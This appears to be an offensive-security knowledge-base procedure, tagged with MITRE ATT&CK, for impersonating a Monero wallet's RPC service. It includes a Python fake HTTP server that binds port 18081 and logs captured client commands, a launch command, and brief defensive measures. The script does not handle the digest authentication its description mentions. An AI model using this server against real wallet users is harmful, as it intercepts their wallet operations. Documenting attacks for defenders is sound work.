---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - rpc-impersonation
  - port-binding
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Linux
  - macOS
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Adversary-in-the-Middle]]'
updated_at: '2025-12-14T17:29:10.124Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Adversary-in-the-Middle]]'
---
# Start-Fake-RPC-Server-on-Monero-Port

## Summary

This procedure involves creating and binding a fake HTTP server to the Monero wallet's RPC port, impersonating the legitimate monero-wallet-rpc to capture incoming requests without server authentication.

## Description

The Monero RPC uses HTTP digest authentication, which verifies the client but not the server, and lacks TLS. The attacker implements a simple server (e.g., in Python or Node.js) that listens on the user-specified port (e.g., 18081), responds to auth challenges, and logs all client commands. This exploits improper access control, allowing unprivileged binding since no root is needed for localhost ports.

## Requirements

1. Knowledge of the RPC bind port from victim's config (e.g., --rpc-bind-port 18081)
2. Programming capability to create a basic HTTP server handling digest auth
3. Access to run processes on the target OS

## Defense

Defensive measures and detection strategies:

- Enforce TLS for RPC interfaces with certificate validation
- Run monero-wallet-rpc as a privileged service or use SO_BIND_SYSTEM for port protection
- Monitor for multiple processes binding to RPC ports using netstat or lsof

## Objectives

1. Hijack the RPC port unprivileged
2. Mimic legitimate server responses
3. Prepare to log client interactions

## Instructions

### Step 1: Implement Fake Server

**Context**: Create a server script that binds to the port and handles HTTP requests.

Example Python script (fake_rpc_server.py):
```python
import http.server
import socketserver
class FakeHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(f"Captured: {post_data}")  # Log command
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'{"result": "ok"}')
with socketserver.TCPServer(("", 18081), FakeHandler) as httpd:
    httpd.serve_forever()
```

> Script ready to handle POST requests for RPC JSON.

### Step 2: Bind and Start Server

**Context**: Launch the fake server on the target port.

```bash
python3 fake_rpc_server.py
```

> Server output: "Serving on port 18081"; no bind errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Adversary-in-the-Middle]] Adversary-in-the-Middle

### Sub-Techniques

- None

## Commands Used

- None specific

## Tools Used

- None

## Tags

- rpc-impersonation
- port-binding
